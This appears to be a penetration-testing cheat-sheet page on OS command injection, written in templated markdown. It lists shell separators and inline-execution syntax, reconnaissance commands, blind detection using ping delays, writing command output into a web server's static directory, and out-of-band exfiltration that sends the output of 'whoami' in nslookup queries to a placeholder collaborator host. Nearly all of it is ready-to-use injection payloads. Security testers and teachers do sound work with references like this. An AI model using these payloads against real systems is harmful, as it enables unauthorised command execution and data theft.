---
title: OS command injection
badge: server-side
---

This attacks occur when applications place user input unsafely when executing shell commands.


## Basic

A basic payload when reflecting output would be:

```shell
{{ separator & }} echo {{ random-string aiwefwlguh }} {{ separator & }}
```


### Ways of OS command injection

A variety of shell metacharacters can be used to perform OS command injection attacks.

A number of characters function as command separators, allowing commands to be chained together. The following command separators work on both Windows and Unix-based systems:

```shell
&
&&
|
||
```

The following command separators work only on Unix-based systems:

```
%0a
%250a
\n
;
```

On Unix-based systems, you can also use backticks or the dollar character to perform inline execution of an injected command within the original command:

```shell
&grave;
{{ injected-command id }}&grave;
```

```shell
$(
{{ injected-command id }})
```

## Useful commands

When you have identified an OS command injection vulnerability, it is generally useful to execute some initial commands to obtain information about the system that you have compromised. Below is a summary of some commands that are useful on Linux and Windows platforms:

| Purpose of command | Linux | Windows |
| --- | --- | --- |
| Name of current user | `whoami` | `whoami` |
| Operating system | `uname -a` | `ver` |
| Network configuration | `ifconfig` | `ipconfig /all` |
| Network connections | `netstat -an` | `netstat -an` |
| Running processes | `ps -ef` | `tasklist` |


## Blind OS command injection

Sometimes the output does not get reflected to the user.

### Detect using time delays

As with other blind injections, time allows you to confirm the presence of such vulnerabilities.
Sending ping packets is very usefull:

```bash
{{ separator & }} ping -c 10 "127.0.0.1" {{ separator & }}
```

### Exploiting redirecting output

You can redirect the output to the static resources dir for the server:


```bash
{{ separator & }} {{ injected-command whoami }} > {{ static-file-path /var/www/static/whoami.txt }} {{ separator & }}
```


### Exploiting using out-of-band (OAST) techniques

The classic. Try to reach your collaborator / interact or whatever:

```bash
{{ separator & }} nslookup "{{ random-string kgji2ohoyw }}.{{ collaborator your-collaborator.net }}" {{ separator & }}
```

Using this you can exfiltrate stuff easily.
For example:

<smart-tabs variable="inline-execution" :tabs="{'backticks': 'Backticks', 'dollar': 'Dollar'}">
<template v-slot:backticks>

```bash
{{ separator & }} nslookup "&grave;{{ injected-command whoami }}&grave;.{{ collaborator your-collaborator.net }}" {{ separator & }}
```

</template>
<template v-slot:dollar>

```bash
{{ separator & }} nslookup "$({{ injected-command whoami }}).{{ collaborator your-collaborator.net }}" {{ separator & }}
```

</template>
</smart-tabs>





